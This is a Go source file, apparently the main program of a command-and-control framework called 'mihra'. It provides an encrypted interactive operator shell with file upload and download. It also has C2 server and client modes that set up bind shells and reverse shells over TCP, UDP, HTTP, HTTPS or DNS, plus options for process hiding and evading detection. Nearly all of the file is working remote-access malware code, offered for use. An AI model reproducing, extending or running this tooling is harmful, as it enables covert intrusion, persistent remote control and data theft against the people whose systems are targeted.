package main

import (
	"crypto/tls"
	"encoding/binary"
	"encoding/gob"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"github.com/peterh/liner"

	"github.com/0xvyper/mihra/core/connector"
	"github.com/0xvyper/mihra/core/crypto"
	"github.com/0xvyper/mihra/core/security"
	"github.com/0xvyper/mihra/keys"
	"github.com/0xvyper/mihra/module"
	"github.com/0xvyper/mihra/modules/evasion"
	"github.com/0xvyper/mihra/modules/sessions"
	"github.com/0xvyper/mihra/modules/shell_anon"
	"github.com/0xvyper/mihra/modules/unpacker"
	"github.com/0xvyper/mihra/shell"
	"github.com/0xvyper/mihra/types"

	_ "embed"
)

const (
	PROTOCOL_VERSION  = types.PROTOCOL_VERSION
	MSG_HANDSHAKE     = types.MSG_HANDSHAKE
	MSG_COMMAND       = types.MSG_COMMAND
	MSG_RESPONSE      = types.MSG_RESPONSE
	MSG_FILE_UPLOAD   = types.MSG_FILE_UPLOAD
	MSG_FILE_DOWNLOAD = types.MSG_FILE_DOWNLOAD
	MSG_ERROR         = types.MSG_ERROR
	HANDSHAKE_OK      = types.HANDSHAKE_OK
	HANDSHAKE_FAILED  = 1
)

type MessageHeader struct {
	Version    byte
	Type       byte
	PayloadLen uint32
}

type SecureShell struct {
	conn         net.Conn
	passphrase   []byte
	sessionID    string
	sessionKey   []byte 
	sessionIV    []byte 
	interactive  bool
	shell        *shell.Shell
	moduleSystem *module.ModuleSystem
}

func NewSecureShell(passphrase string, interactive bool, moduleSystem *module.ModuleSystem) *SecureShell {
	return &SecureShell{
		passphrase:   []byte(passphrase),
		interactive:  interactive,
		shell:        shell.NewShell(),
		moduleSystem: moduleSystem,
	}
}

func (s *SecureShell) Connect(host string, port int, useTLS bool) error {
	var err error
	addr := fmt.Sprintf("%s:%d", host, port)
	if useTLS {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			},
		}
		s.conn, err = tls.Dial("tcp", addr, tlsConfig)
	} else {
		s.conn, err = net.Dial("tcp", addr)
	}
	if err != nil {
		return fmt.Errorf("connection failed: %v", err)
	}
	fmt.Printf("Connected to %s\n", addr)

	sessionModule, err := s.moduleSystem.Manager.LoadModule("sessions")
	if err != nil {
		s.conn.Close()
		return fmt.Errorf("failed to load sessions module: %v", err)
	}

	if err := s.performHandshake(host, port, string(s.passphrase), useTLS, sessionModule); err != nil {
		s.conn.Close()
		return fmt.Errorf("handshake failed: %v", err)
	}

	fmt.Println("Secure connection established")
	return nil
}

func (s *SecureShell) performHandshake(host string, port int, passphrase string, useTLS bool, sessionModule module.ModuleInterface) error {
	decoder := gob.NewDecoder(s.conn)
	encoder := gob.NewEncoder(s.conn)

	var sessionID string
	if err := decoder.Decode(&sessionID); err != nil {
		return fmt.Errorf("failed to receive session ID: %v", err)
	}
	if sessionID == "" {
		return fmt.Errorf("received empty session ID")
	}
	s.sessionID = sessionID
	fmt.Printf("Received session ID: %s\n", sessionID)

	var encryptedKey, encryptedIV []byte
	if err := decoder.Decode(&encryptedKey); err != nil {
		return fmt.Errorf("failed to receive encrypted key: %v", err)
	}
	if len(encryptedKey) == 0 {
		return fmt.Errorf("received empty encrypted key")
	}
	fmt.Printf("Received encrypted key: %d bytes\n", len(encryptedKey))

	if err := decoder.Decode(&encryptedIV); err != nil {
		return fmt.Errorf("failed to receive encrypted IV: %v", err)
	}
	if len(encryptedIV) == 0 {
		return fmt.Errorf("received empty encrypted IV")
	}
	fmt.Printf("Received encrypted IV: %d bytes\n", len(encryptedIV))

	
	privateKey, err := keys.GetPrivateKeyPEM()
	if err != nil {
		return fmt.Errorf("failed to retrieve private key: %v", err)
	}

	key, err := crypto.RsaDecoding(privateKey, encryptedKey)
	if err != nil {
		return fmt.Errorf("failed to decrypt session key: %v", err)
	}
	if len(key) != 32 {
		return fmt.Errorf("invalid session key length: got %d, expected 32", len(key))
	}
	fmt.Printf("Decrypted session key: %d bytes\n", len(key))

	iv, err := crypto.RsaDecoding(privateKey, encryptedIV)
	if err != nil {
		return fmt.Errorf("failed to decrypt session IV: %v", err)
	}
	if len(iv) != 16 {
		return fmt.Errorf("invalid session IV length: got %d, expected 16", len(iv))
	}
	fmt.Printf("Decrypted session IV: %d bytes\n", len(iv))

	s.sessionKey = key
	s.sessionIV = iv

	response := []byte{HANDSHAKE_OK}
	if err := encoder.Encode(response); err != nil {
		return fmt.Errorf("failed to send handshake response: %v", err)
	}

	_, err = sessionModule.ExecuteCommand("register", []string{host, fmt.Sprintf("%d", port), passphrase, sessionID, fmt.Sprintf("%t", useTLS)})
	if err != nil {
		return fmt.Errorf("failed to register session: %v", err)
	}
	fmt.Printf("Session %s registered successfully\n", sessionID)

	_, err = sessionModule.ExecuteCommand("connect", []string{"new", host, fmt.Sprintf("%d", port), passphrase, fmt.Sprintf("%t", useTLS)})
	if err != nil {
		return fmt.Errorf("failed to connect session: %v", err)
	}
	fmt.Printf("Session %s connected successfully\n", sessionID)

	return nil
}
func (s *SecureShell) sendMessage(msgType byte, payload []byte) error {
	encryptedPayload, err := crypto.AESEncrypt(payload, s.sessionKey)
	if err != nil {
		return fmt.Errorf("encryption failed: %v", err)
	}

	header := MessageHeader{
		Version:    PROTOCOL_VERSION,
		Type:       msgType,
		PayloadLen: uint32(len(encryptedPayload)),
	}

	if err := binary.Write(s.conn, binary.BigEndian, header.Version); err != nil {
		return err
	}
	if err := binary.Write(s.conn, binary.BigEndian, header.Type); err != nil {
		return err
	}
	if err := binary.Write(s.conn, binary.BigEndian, header.PayloadLen); err != nil {
		return err
	}

	_, err = s.conn.Write(encryptedPayload)
	return err
}

func (s *SecureShell) receiveMessage() (byte, []byte, error) {
	var header MessageHeader
	if err := binary.Read(s.conn, binary.BigEndian, &header.Version); err != nil {
		return 0, nil, err
	}
	if err := binary.Read(s.conn, binary.BigEndian, &header.Type); err != nil {
		return 0, nil, err
	}
	if err := binary.Read(s.conn, binary.BigEndian, &header.PayloadLen); err != nil {
		return 0, nil, err
	}
	if header.Version != PROTOCOL_VERSION {
		return 0, nil, fmt.Errorf("unsupported protocol version: %d", header.Version)
	}

	encryptedPayload := make([]byte, header.PayloadLen)
	if _, err := io.ReadFull(s.conn, encryptedPayload); err != nil {
		return 0, nil, err
	}

	payload, err := crypto.AESDecrypt(encryptedPayload, s.sessionKey)
	if err != nil {
		return 0, nil, fmt.Errorf("decryption failed: %v", err)
	}
	return header.Type, payload, nil
}

func (s *SecureShell) RunInteractive() error {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\nExiting...")
		if s.conn != nil {
			s.conn.Close()
		}
		os.Exit(0)
	}()

	line := liner.NewLiner()
	defer line.Close()

	line.SetCtrlCAborts(true)
	historyFile := os.Getenv("HOME") + "/.c2_history"
	if f, err := os.Open(historyFile); err == nil {
		line.ReadHistory(f)
		f.Close()
	}

	line.SetCompleter(func(line string) (c []string) {
		commands := []string{
			"upload ", "download ", "cd ", "pwd", "/sessions ",
			"/sessions connect ", "/sessions disconnect", "/sessions listsessions",
			"/sessions changesession ", "/sessions execute ", "/sessions status",
			"exit",
		}
		for _, cmd := range commands {
			if strings.HasPrefix(cmd, strings.ToLower(line)) {
				c = append(c, cmd)
			}
		}
		return
	})

	fmt.Println("Secure shell ready. Type 'exit' to quit.")
	fmt.Println("Special commands:")
	fmt.Println("  upload <local_file> <remote_file> - Upload a file")
	fmt.Println("  download <remote_file> <local_file> - Download a file")
	fmt.Println("  cd <directory> - Change directory")
	fmt.Println("  pwd - Print working directory")
	fmt.Println("  /sessions [subcommand] - Manage sessions")

	for {
		command, err := line.Prompt("> ")
		if err == liner.ErrPromptAborted || err == io.EOF {
			break
		}
		if err != nil {
			fmt.Printf("Error reading input: %v\n", err)
			break
		}

		command = strings.TrimSpace(command)
		if command == "" {
			continue
		}

		line.AppendHistory(command)

		if len(command) > 7 && command[:7] == "upload " {
			var localFile, remoteFile string
			fmt.Sscanf(command[7:], "%s %s", &localFile, &remoteFile)
			if localFile == "" || remoteFile == "" {
				fmt.Println("Usage: upload <local_file> <remote_file>")
				continue
			}
			if s.conn == nil {
				fmt.Println("Error: no active connection")
				continue
			}
			if err := s.uploadFile(localFile, remoteFile); err != nil {
				fmt.Printf("Upload failed: %v\n", err)
			} else {
				fmt.Println("Upload complete")
			}
			continue
		}
		if len(command) > 9 && command[:9] == "download " {
			var remoteFile, localFile string
			fmt.Sscanf(command[9:], "%s %s", &remoteFile, &localFile)
			if remoteFile == "" || localFile == "" {
				fmt.Println("Usage: download <remote_file> <local_file>")
				continue
			}
			if s.conn == nil {
				fmt.Println("Error: no active connection")
				continue
			}
			if err := s.downloadFile(remoteFile, localFile); err != nil {
				fmt.Printf("Download failed: %v\n", err)
			} else {
				fmt.Println("Download complete")
			}
			continue
		}
		if len(command) >= 9 && command[:9] == "/sessions" {
			sessionModule, err := s.moduleSystem.Manager.LoadModule("sessions")
			if err != nil {
				fmt.Printf("Error loading sessions module: %v\n", err)
				continue
			}

			parts := strings.Fields(command)
			if len(parts) == 1 {
				result, err := sessionModule.ExecuteCommand("listsessions", []string{})
				if err != nil {
					fmt.Printf("Error executing listsessions: %v\n", err)
					continue
				}
				for _, line := range result.([]string) {
					fmt.Println("session:", line)
				}
			} else {
				subcommand := parts[1]
				args := parts[2:]
				result, err := sessionModule.ExecuteCommand(subcommand, args)
				if err != nil {
					fmt.Printf("Error executing %s: %v\n", subcommand, err)
					continue
				}
				switch subcommand {
				case "listsessions":
					for _, line := range result.([]string) {
						fmt.Println("session:", line)
					}
				case "connect", "changesession", "execute", "register":
					fmt.Println(result.(string))
				case "disconnect":
					fmt.Println(result.(string))
					if len(args) > 0 {
						s.sessionID = args[0]
						s.conn = nil
					}
				case "status":
					for key, value := range result.(map[string]interface{}) {
						fmt.Printf("%s: %v\n", key, value)
					}
				default:
					fmt.Printf("Unknown subcommand: %s\n", subcommand)
				}
			}
			continue
		}

		if s.conn == nil {
			fmt.Println("Error: no active connection. Use '/sessions connect' to establish a connection")
			continue
		}
		if err := s.sendMessage(MSG_COMMAND, []byte(command)); err != nil {
			fmt.Printf("Error sending command: %v\n", err)
			break
		}

		msgType, payload, err := s.receiveMessage()
		if err != nil {
			fmt.Printf("Error receiving response: %v\n", err)
			break
		}
		if msgType == MSG_ERROR {
			fmt.Printf("Error: %s\n", string(payload))
		} else if msgType == MSG_RESPONSE {
			fmt.Println(string(payload))
		} else {
			fmt.Printf("Unexpected message type: %d\n", msgType)
		}
	}

	if f, err := os.Create(historyFile); err == nil {
		line.WriteHistory(f)
		f.Close()
	}

	return nil
}

func (s *SecureShell) uploadFile(localPath, remotePath string) error {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return err
	}

	uploadMsg := append([]byte(remotePath), 0)
	uploadMsg = append(uploadMsg, data...)

	if err := s.sendMessage(MSG_FILE_UPLOAD, uploadMsg); err != nil {
		return err
	}

	msgType, payload, err := s.receiveMessage()
	if err != nil {
		return err
	}
	if msgType == MSG_ERROR {
		return fmt.Errorf("server error: %s", string(payload))
	}
	return nil
}

func (s *SecureShell) downloadFile(remotePath, localPath string) error {
	if err := s.sendMessage(MSG_FILE_DOWNLOAD, []byte(remotePath)); err != nil {
		return err
	}

	msgType, payload, err := s.receiveMessage()
	if err != nil {
		return err
	}
	if msgType == MSG_ERROR {
		return fmt.Errorf("server error: %s", string(payload))
	}
	if msgType != MSG_FILE_DOWNLOAD {
		return fmt.Errorf("unexpected message type: %d", msgType)
	}

	return os.WriteFile(localPath, payload, 0644)
}

func (s *SecureShell) ExecuteCommand(command string) (string, error) {
	if s.conn == nil {
		return "", fmt.Errorf("no active connection")
	}
	if err := s.sendMessage(MSG_COMMAND, []byte(command)); err != nil {
		return "", err
	}

	msgType, payload, err := s.receiveMessage()
	if err != nil {
		return "", err
	}
	if msgType == MSG_ERROR {
		return "", fmt.Errorf("server error: %s", string(payload))
	}
	if msgType != MSG_RESPONSE {
		return "", fmt.Errorf("unexpected message type: %d", msgType)
	}
	return string(payload), nil
}

func (s *SecureShell) Close() {
	if s.conn != nil {
		s.conn.Close()
	}
}

func registerBuiltinModules(moduleSystem *module.ModuleSystem) {
	if runtime.GOOS == "linux" {
		evasionModule := evasion.NewModule()
		moduleSystem.Registry.RegisterModule("evasion", func() module.ModuleInterface {
			return evasionModule
		})
	}
	sessionModule := sessions.NewModule()
	moduleSystem.Registry.RegisterModule("sessions", func() module.ModuleInterface {
		return sessionModule
	})
	unpackerModule := unpacker.NewModule()
	moduleSystem.Registry.RegisterModule("unpacker", func() module.ModuleInterface {
		return unpackerModule
	})
	shellAnonModule := shell_anon.NewModule()
	moduleSystem.Registry.RegisterModule("shell_anon", func() module.ModuleInterface {
		return shellAnonModule
	})
}

func generateKeyPair() error {
	fmt.Println("Generating new RSA key pair...")
	return fmt.Errorf("key generation not implemented")
}

func main() {
	
	shellHostFlag := flag.String("shell-host", "", "Host to connect to (secure_shell mode)")
	shellPortFlag := flag.Int("shell-port", 8443, "Port to connect to (secure_shell mode)")
	passphraseFlag := flag.String("passphrase", "default-passphrase", "Passphrase for encryption (secure_shell mode)")
	useTLSFlag := flag.Bool("tls", false, "Use TLS encryption (secure_shell mode)")
	interactiveFlag := flag.Bool("interactive", true, "Run in interactive mode (secure_shell mode)")
	commandFlag := flag.String("command", "", "Single command to execute (non-interactive secure_shell mode)")

	
	c2ModeFlag := flag.String("mode", "", "Mode: 'secure_shell', 'c2-server', or 'c2-client'")
	hostFlag := flag.String("host", "localhost", "Host to connect to or listen on (c2 mode)")
	portFlag := flag.String("port", "8443", "Port to connect to or listen on (c2 mode)")
	serverFlag := flag.Bool("server", false, "Run in server mode (c2 mode)")
	clientFlag := flag.Bool("client", false, "Run in client mode (c2 mode)")
	secureFlag := flag.Bool("secure", true, "Use encryption (c2 mode)")
	protocolFlag := flag.String("protocol", "tcp", "Protocol to use: tcp, udp, http, https, dns (c2 mode)")
	hideFlag := flag.Bool("hide", false, "Apply process hiding (c2 mode)")
	anonymizeFlag := flag.Bool("anonymize", false, "Apply shell anonymization (c2 mode)")
	moduleListFlag := flag.Bool("list-modules", false, "List available modules (c2 mode)")
	moduleInfoFlag := flag.String("module-info", "", "Show information about a module (c2 mode)")
	moduleFlag := flag.String("module", "", "Run a specific module (c2 mode)")
	keyGenFlag := flag.Bool("keygen", false, "Generate new key pair and exit")

	flag.Parse()

	moduleSystem := module.NewModuleSystem()
	registerBuiltinModules(moduleSystem)

	
	if *keyGenFlag {
		if err := generateKeyPair(); err != nil {
			fmt.Printf("Error generating key pair: %v\n", err)
			os.Exit(1)
		}
		os.Exit(0)
	}

	
	if *moduleListFlag {
		fmt.Println("Available modules:")
		for _, name := range moduleSystem.Registry.ListModules() {
			fmt.Printf("- %s\n", name)
		}
		os.Exit(0)
	}

	if *moduleInfoFlag != "" {
		fmt.Println("Module information for: " + *moduleInfoFlag)
		fmt.Println("-------------------" + strings.Repeat("-", len(*moduleInfoFlag)))
		factory, err := moduleSystem.Registry.GetModule(*moduleInfoFlag)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}
		mod := factory()
		info := mod.GetInfo()
		fmt.Printf("Name: %s\n", info.Name)
		fmt.Printf("Version: %s\n", info.Version)
		fmt.Printf("Description: %s\n", info.Description)
		fmt.Printf("Author: %s\n", info.Author)
		fmt.Println("\nCommands:")
		for _, cmd := range info.Commands {
			fmt.Printf("  %s - %s\n", cmd.Name, cmd.Description)
			fmt.Printf("    Usage: %s\n", cmd.Usage)
			fmt.Printf("    Options:\n")
			for k, v := range cmd.Options {
				fmt.Printf("      %s: %s\n", k, v)
			}
		}
		fmt.Println("\nOptions:")
		for k, v := range info.Options {
			fmt.Printf("  %s: %s\n", k, v)
		}
		os.Exit(0)
	}

	if *moduleFlag != "" {
		fmt.Printf("Running module: %s\n", *moduleFlag)
		mod, err := moduleSystem.Manager.LoadModule(*moduleFlag)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}

		info := mod.GetInfo()
		fmt.Printf("Module: %s (v%s)\n", info.Name, info.Version)
		fmt.Printf("Description: %s\n", info.Description)
		fmt.Printf("Author: %s\n", info.Author)

		if len(flag.Args()) > 0 {
			cmdName := flag.Args()[0]
			cmdArgs := flag.Args()[1:]
			result, err := mod.ExecuteCommand(cmdName, cmdArgs)
			if err != nil {
				fmt.Printf("Error executing command: %v\n", err)
				os.Exit(1)
			}
			fmt.Printf("Result: %v\n", result)
		} else {
			fmt.Println("No command specified. Available commands:")
			for _, cmd := range info.Commands {
				fmt.Printf("  %s - %s\n", cmd.Name, cmd.Description)
				fmt.Printf("    Usage: %s\n", cmd.Usage)
			}
		}
		os.Exit(0)
	}

	
	if *anonymizeFlag {
		shellAnonModule, err := moduleSystem.Manager.LoadModule("shell_anon")
		if err != nil {
			fmt.Printf("Error loading shell_anon module: %v\n", err)
			os.Exit(1)
		}
		result, err := shellAnonModule.ExecuteCommand("setup", []string{})
		if err != nil {
			fmt.Printf("Error applying shell anonymization: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Shell anonymization applied: %v\n", result)
	}

	
	if *hideFlag {
		hideModule, err := moduleSystem.Manager.LoadModule("evasion")
		if err != nil {
			fmt.Printf("Error loading evasion module: %v\n", err)
			os.Exit(1)
		}
		result, err := hideModule.ExecuteCommand("seccomp", []string{})
		if err != nil {
			fmt.Printf("Error applying process hiding: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Process hiding applied: %v\n", result)
	}

	
	port, err := strconv.Atoi(*portFlag)
	if err != nil {
		fmt.Printf("Error parsing port: %v\n", err)
		os.Exit(1)
	}

	
	switch *c2ModeFlag {
	case "secure_shell":
		if *shellHostFlag == "" {
			fmt.Println("Error: shell-host must be specified in secure_shell mode")
			os.Exit(1)
		}
		secureShell := NewSecureShell(*passphraseFlag, *interactiveFlag, moduleSystem)
		defer secureShell.Close()

		err := secureShell.Connect(*shellHostFlag, *shellPortFlag, *useTLSFlag)
		if err != nil {
			fmt.Printf("Connection failed: %v\n", err)
			os.Exit(1)
		}

		if *interactiveFlag && *commandFlag == "" {
			if err := secureShell.RunInteractive(); err != nil {
				fmt.Printf("Error: %v\n", err)
				os.Exit(1)
			}
		} else if *commandFlag != "" {
			output, err := secureShell.ExecuteCommand(*commandFlag)
			if err != nil {
				fmt.Printf("Error: %v\n", err)
				os.Exit(1)
			}
			fmt.Println(output)
		} else {
			fmt.Println("Error: specify either interactive mode or a command in secure_shell mode")
			os.Exit(1)
		}

	case "c2-server":
		if !*serverFlag {
			fmt.Println("Error: server flag must be set in c2-server mode")
			os.Exit(1)
		}
		var protocol connector.Protocol
		switch strings.ToLower(*protocolFlag) {
		case "tcp":
			protocol = connector.TCP
		case "udp":
			protocol = connector.UDP
		case "http":
			protocol = connector.HTTP
		case "https":
			protocol = connector.HTTPS
		case "dns":
			protocol = connector.DNS
		default:
			fmt.Printf("Error: Unsupported protocol: %s\n", *protocolFlag)
			os.Exit(1)
		}

		secManager := security.NewSecurityManager()
		fmt.Printf("Starting C2 server on %s:%d...\n", *hostFlag, port)
		config := &connector.ConnectorConfig{
			Type:           connector.BindShell,
			Protocol:       protocol,
			Host:           *hostFlag,
			Port:           port,
			Secure:         *secureFlag,
			SecurityConfig: secManager,
		}
		c := connector.NewConnector(config)
		err := c.Start()
		if err != nil {
			fmt.Printf("Error starting C2 server: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("C2 server started on %s:%d\n", *hostFlag, port)
		fmt.Println("Press Ctrl+C to stop")
		select {}

	case "c2-client":
		if !*clientFlag {
			fmt.Println("Error: client flag must be set in c2-client mode")
			os.Exit(1)
		}
		if *hostFlag == "" {
			fmt.Println("Error: hostage must be specified in c2-client mode")
			os.Exit(1)
		}
		var protocol connector.Protocol
		switch strings.ToLower(*protocolFlag) {
		case "tcp":
			protocol = connector.TCP
		case "udp":
			protocol = connector.UDP
		case "http":
			protocol = connector.HTTP
		case "https":
			protocol = connector.HTTPS
		case "dns":
			protocol = connector.DNS
		default:
			fmt.Printf("Error: Unsupported protocol: %s\n", *protocolFlag)
			os.Exit(1)
		}

		secManager := security.NewSecurityManager()
		fmt.Printf("Starting C2 client to %s:%d...\n", *hostFlag, port)
		config := &connector.ConnectorConfig{
			Type:           connector.ReverseShell,
			Protocol:       protocol,
			Host:           *hostFlag,
			Port:           port,
			Secure:         *secureFlag,
			SecurityConfig: secManager,
		}
		c := connector.NewConnector(config)
		err := c.Start()
		if err != nil {
			fmt.Printf("Error starting C2 client: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("C2 client started to %s:%d\n", *hostFlag, port)
		fmt.Println("Press Ctrl+C to stop")
		select {}

	default:
		if *c2ModeFlag != "" {
			fmt.Printf("Error: Invalid mode: %s. Use 'secure_shell', 'c2-server', or 'c2-client'\n", *c2ModeFlag)
			os.Exit(1)
		}
		if !*moduleListFlag && !*keyGenFlag && *moduleInfoFlag == "" && *moduleFlag == "" {
			fmt.Println("Error: You must specify a mode or a module-related command")
			flag.Usage()
			os.Exit(1)
		}
	}
}
